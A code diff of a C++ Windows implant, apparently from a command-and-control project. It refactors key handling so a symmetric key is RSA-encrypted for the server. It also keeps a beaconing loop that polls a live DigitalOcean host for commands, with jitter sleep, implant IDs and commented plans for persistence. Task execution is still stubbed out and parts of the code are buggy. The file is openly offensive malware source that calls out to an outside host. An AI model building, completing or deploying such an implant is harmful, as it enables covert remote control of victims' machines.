@@ -72,7 +72,7 @@ char *getsecret()
     return secret;
 }
 
-BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey)
+BCRYPT_KEY_HANDLE newsymkey()
 {
     BCRYPT_ALG_HANDLE ahandle;
     BCRYPT_KEY_HANDLE symkeyhandle;
@@ -86,11 +86,17 @@ BCRYPT_KEY_HANDLE newsymkey(BCRYPT_KEY_HANDLE rsakey)
     char *secret = getsecret();
     BCryptGenerateSymmetricKey(ahandle, &symkeyhandle, NULL, 0, (PUCHAR)secret, 8, 0);
     free(symkeylen);
+    return symkeyhandle;
+}
 
-
+ULONG getkeysize(BCRYPT_KEY_HANDLE symkeyhandle){
     //Get datablob required size
     ULONG blobsize;
     BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,NULL,0,&blobsize,0);
+    return blobsize;
+}
+
+BLOB* getkeytext(BCRYPT_KEY_HANDLE symkeyhandle,ULONG blobsize){
     //Make blob, export key to blob
     BLOB* keyblob=(BLOB*)malloc(blobsize);
     BCryptExportKey(symkeyhandle,NULL,BCRYPT_KEY_DATA_BLOB,(PUCHAR)keyblob,blobsize,&blobsize,0);
@@ -234,158 +240,6 @@ std::string getTasks(int implant_id)
     std::string item = makeHttpRequest("sea-lion-app-f5nrq.ondigitalocean.app", 443, "/get_commands", implant_id);
     return item;
 }
-
-void runLoop(int implant_id)
-{
-    int jitter;
-    int i=0;
-    BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)serverpublickey,(ULONG)562);
-    BCRYPT_KEY_HANDLE symkey=newsymkey(rsakey);
-    //char* encbuffer=rsaEncrypt(rsakey,);
-    //register()
-    //PERSISTANCE ONCE IMPLANT HAS BEEN MADE
-    // PREFERABLY DO NOT TEST THIS ON YOUR MACHINE
-    //persist_execution();
-    while (true)
-    {
-        try
-        {
-            i+=1;
-            if(i==40){
-                newsymkey(rsakey);
-                i=0;
-            }
-
-            // WAS FOR TESTING PURPOSES - CHANGE LATER
-            std::string getting = getTasks(implant_id);
-            jitter = rand() * 10;
-            Sleep(SLEEP + jitter);
-            std::cout << getting << std::endl;
-            // WHEN WE GET THE FORMAT, THEN PARSE
-            // THEN AFTER PARSE FEED INTO EXECUTE
-
-            // const auto serverResponse = std::async(std::launch::async, getTasks);
-            // auto parsedTasks = parseTasks(serverResponse.get());
-            // auto success = executeTasks(parsedTasks);
-        }
-        catch (const std::exception &e)
-        {
-            printf("\nError in runLoop: %s\n", e.what());
-        }
-
-        // SET SLEEP HERE
-    }
-}
-
-// INITIALLY MADE FOR RANDOM HEX - WE CAN CHANGE TO RANDOM INT
-// IF WE CONTINUE TO USE RANDOM HEX - HTTP REQUEST NEEDS TO BE CHANGED
-
-// Random Implant ID in hex using rand()
-// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
-char *random_id()
-{
-    char random_hex[32 + 1];
-    char *random_hexptr = random_hex;
-
-    srand(time(0));
-    for (int i = 0; i < 32; i++)
-    {
-        sprintf(random_hex + i, "%x", rand() % 32);
-    }
-
-    return random_hexptr;
-}
-
-// INITIALLY MADE TO CREATE A POINTER TO AN IMPLANT ID STRING
-// NOT SURE IF STILL NEEDED
-char *make_base_payload(char *implant_id)
-{
-    char payload[51] = "{\"implant_id\": }";
-    char *payloadptr = payload;
-    strcat(payload, implant_id);
-    return payloadptr;
-}
-
-int main(int argc, char *argv[])
-{
-
-
-
-    //int implant_id = get_id();
-    int implant_id=0;
-    runLoop(implant_id);
-    return 0;
-}
-
-/* Code not used
-
-
-LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
-    HINTERNET httpsession = WinHttpOpen(
-        L"GenericAPICaller",
-        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
-        WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS,
-        0);
-    if(httpsession!=NULL){
-        HINTERNET connectsesh = WinHttpConnect(
-            httpsession,
-            servername,
-            INTERNET_DEFAULT_HTTPS_PORT,
-            0);
-        if (connectsesh != NULL)
-        {
-            HINTERNET request = WinHttpOpenRequest(
-                connectsesh,
-                L"GET",
-                subdirectory,
-                NULL,
-                WINHTTP_NO_REFERER,
-                WINHTTP_DEFAULT_ACCEPT_TYPES,
-                WINHTTP_FLAG_SECURE);
-            if (request != NULL)
-            {
-                BOOL idrequest = WinHttpSendRequest(
-                    request,
-                    WINHTTP_NO_ADDITIONAL_HEADERS,
-                    0,
-                    NULL,
-                    0,
-                    0,
-                    0);
-                if (idrequest == TRUE)
-                {
-                    BOOL response = WinHttpReceiveResponse(
-                        request,
-                        NULL);
-                    if(response==true)
-                    {
-                        DWORD bytesneeded;
-                        BOOL query= WinHttpQueryDataAvailable(
-                        request,
-                        &bytesneeded);
-                        LPSTR returnbuffer=new char[bytesneeded+1];
-                        if(query==TRUE){
-                            if(returnbuffer){
-                                ZeroMemory(returnbuffer, bytesneeded+1);
-                                BOOL dataread=WinHttpReadData(
-                                request,
-                                returnbuffer,
-                                bytesneeded+1,
-                                NULL);
-                                if(dataread==TRUE){
-                                    return returnbuffer;
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }
-    }
-}
-
-
 LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
 {
     DWORD datalen = strlen(postdata);
@@ -463,4 +317,238 @@ LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *post
         }
     }
 }
+
+
+void runLoop(int implant_id)
+{
+    int jitter;
+    int i=0;
+    BCRYPT_KEY_HANDLE rsakey=importrsakey((PUCHAR)serverpublickey,(ULONG)562);
+    BCRYPT_KEY_HANDLE symkey=newsymkey();
+    ULONG symkeysize=getkeysize(symkey);
+    BLOB* symkeytext=getkeytext(symkey,symkeysize);
+    PUCHAR encbuffer=rsaEncrypt(rsakey,(PUCHAR) symkeytext,symkeysize);
+
+    //char* encbuffer=rsaEncrypt(rsakey,);
+    //register()
+    //PERSISTANCE ONCE IMPLANT HAS BEEN MADE
+    // PREFERABLY DO NOT TEST THIS ON YOUR MACHINE
+    //persist_execution();
+    while (true)
+    {
+        try
+        {
+            i+=1;
+            if(i==40){
+                newsymkey(rsakey);
+                i=0;
+            }
+
+            // WAS FOR TESTING PURPOSES - CHANGE LATER
+            std::string getting = getTasks(implant_id);
+            jitter = rand() * 10;
+            Sleep(SLEEP + jitter);
+            std::cout << getting << std::endl;
+            // WHEN WE GET THE FORMAT, THEN PARSE
+            // THEN AFTER PARSE FEED INTO EXECUTE
+
+            // const auto serverResponse = std::async(std::launch::async, getTasks);
+            // auto parsedTasks = parseTasks(serverResponse.get());
+            // auto success = executeTasks(parsedTasks);
+        }
+        catch (const std::exception &e)
+        {
+            printf("\nError in runLoop: %s\n", e.what());
+        }
+
+        // SET SLEEP HERE
+    }
+}
+
+// INITIALLY MADE FOR RANDOM HEX - WE CAN CHANGE TO RANDOM INT
+// IF WE CONTINUE TO USE RANDOM HEX - HTTP REQUEST NEEDS TO BE CHANGED
+
+// Random Implant ID in hex using rand()
+// https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
+char *random_id()
+{
+    char random_hex[32 + 1];
+    char *random_hexptr = random_hex;
+
+    srand(time(0));
+    for (int i = 0; i < 32; i++)
+    {
+        sprintf(random_hex + i, "%x", rand() % 32);
+    }
+
+    return random_hexptr;
+}
+
+// INITIALLY MADE TO CREATE A POINTER TO AN IMPLANT ID STRING
+// NOT SURE IF STILL NEEDED
+char *make_base_payload(char *implant_id)
+{
+    char payload[51] = "{\"implant_id\": }";
+    char *payloadptr = payload;
+    strcat(payload, implant_id);
+    return payloadptr;
+}
+
+int main(int argc, char *argv[])
+{
+
+
+
+    //int implant_id = get_id();
+    int implant_id=0;
+    
+    runLoop(implant_id);
+    return 0;
+}
+
+/* Code not used
+
+
+LPSTR makeGetRequest(LPCWSTR servername, LPCWSTR subdirectory){
+    HINTERNET httpsession = WinHttpOpen(
+        L"GenericAPICaller",
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0);
+    if(httpsession!=NULL){
+        HINTERNET connectsesh = WinHttpConnect(
+            httpsession,
+            servername,
+            INTERNET_DEFAULT_HTTPS_PORT,
+            0);
+        if (connectsesh != NULL)
+        {
+            HINTERNET request = WinHttpOpenRequest(
+                connectsesh,
+                L"GET",
+                subdirectory,
+                NULL,
+                WINHTTP_NO_REFERER,
+                WINHTTP_DEFAULT_ACCEPT_TYPES,
+                WINHTTP_FLAG_SECURE);
+            if (request != NULL)
+            {
+                BOOL idrequest = WinHttpSendRequest(
+                    request,
+                    WINHTTP_NO_ADDITIONAL_HEADERS,
+                    0,
+                    NULL,
+                    0,
+                    0,
+                    0);
+                if (idrequest == TRUE)
+                {
+                    BOOL response = WinHttpReceiveResponse(
+                        request,
+                        NULL);
+                    if(response==true)
+                    {
+                        DWORD bytesneeded;
+                        BOOL query= WinHttpQueryDataAvailable(
+                        request,
+                        &bytesneeded);
+                        LPSTR returnbuffer=new char[bytesneeded+1];
+                        if(query==TRUE){
+                            if(returnbuffer){
+                                ZeroMemory(returnbuffer, bytesneeded+1);
+                                BOOL dataread=WinHttpReadData(
+                                request,
+                                returnbuffer,
+                                bytesneeded+1,
+                                NULL);
+                                if(dataread==TRUE){
+                                    return returnbuffer;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+
  Code not used */
+LPSTR makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
+{
+    DWORD datalen = strlen(postdata);
+    HINTERNET httpsession = WinHttpOpen(
+        L"GenericAPICaller",
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        0);
+    if (httpsession != NULL)
+    {
+        HINTERNET connectsesh = WinHttpConnect(
+            httpsession,
+            servername,
+            INTERNET_DEFAULT_HTTPS_PORT,
+            0);
+        if (connectsesh != NULL)
+        {
+            HINTERNET request = WinHttpOpenRequest(
+                connectsesh,
+                L"POST",
+                subdirectory,
+                NULL,
+                WINHTTP_NO_REFERER,
+                WINHTTP_DEFAULT_ACCEPT_TYPES,
+                WINHTTP_FLAG_SECURE);
+            if (request != NULL)
+            {
+
+
+                if(WinHttpAddRequestHeaders(request, L"\"Content-Type\": \"application/json\"", (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD)){
+                    printf("YOU SET HEADER");
+                }
+
+
+                BOOL idrequest = WinHttpSendRequest(
+                    request,
+                    WINHTTP_NO_ADDITIONAL_HEADERS,
+                    0,
+                    (LPVOID)postdata,
+                    datalen,
+                    datalen,
+                    0);
+                if (idrequest == TRUE)
+                {
+                    BOOL response = WinHttpReceiveResponse(
+                        request,
+                        NULL);
+                    if (response == true)
+                    {
+                        DWORD bytesneeded;
+                        BOOL query = WinHttpQueryDataAvailable(
+                            request,
+                            &bytesneeded);
+                        LPSTR returnbuffer = new char[bytesneeded + 1];
+                        if (query == TRUE)
+                        {
+                            if (returnbuffer)
+                            {
+                                ZeroMemory(returnbuffer, bytesneeded + 1);
+                                BOOL dataread = WinHttpReadData(
+                                    request,
+                                    returnbuffer,
+                                    bytesneeded + 1,
+                                    NULL);
+                                if (dataread == TRUE)
+                                {
+                                    return returnbuffer;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
